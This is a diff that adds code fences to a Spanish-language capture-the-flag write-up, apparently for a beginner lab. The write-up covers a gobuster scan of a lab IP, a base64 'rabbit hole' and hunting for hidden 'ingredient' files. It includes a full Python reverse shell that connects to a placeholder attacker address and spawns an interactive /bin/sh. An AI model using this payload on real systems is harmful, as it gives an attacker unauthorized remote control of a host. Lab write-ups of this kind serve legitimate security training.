@@ -42,7 +42,9 @@ se puede visualizar esto.
 Al inspeccionar el código fuente de la página, encontré un comentario que contenía un
 posible usuario. Luego, ejecuté un escaneo de directorios con gobuster para descubrir
 archivos o directorios interesantes.
+```
 gobuster dir -u [http://10.10.215.34](http://10.10.215.34) -w
+```
 ~/git/SecLists/Discovery/Web-Content/raft-large-files.txt -t 50
 Encontre un inicio de sesión y un archivo txt, en el cual contenía el siguiente contenido
 
@@ -62,6 +64,7 @@ Después de realizar este proceso cinco veces, descubrí que el mensaje decodifi
 Rabbit hole, lo cual significa que era una trampa diseñada para distraer al atacante.
 Una vez superada esta distracción, decidí probar una reverse shell en el input de
 comandos:
+```
 import socket,subprocess,os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("ip-atacante", 4444)) # Conectamos al atacante
@@ -69,16 +72,16 @@ os.dup2(s.fileno(), 0) # Redirigimos entrada estándar
 os.dup2(s.fileno(), 1) # Redirigimos salida estándar
 os.dup2(s.fileno(), 2) # Redirigimos error estándar
 subprocess.call(["/bin/sh", "-i"]) # Obtenemos una shell interactiva
-
+```
 ## Obtención de los Ingredientes
 
 ### Primer Ingrediente
 
-```
+
 ● Se encontraba en el directorio por defecto con el nombre
 Sup3rS3cretPickl3Ingred.txt.
 ● Como cat y nano estaban deshabilitados, utilicé less para visualizar su contenido:
-```
+
 
 **Segundo Ingrediente**
 ● Ubicado en el directorio de rick.
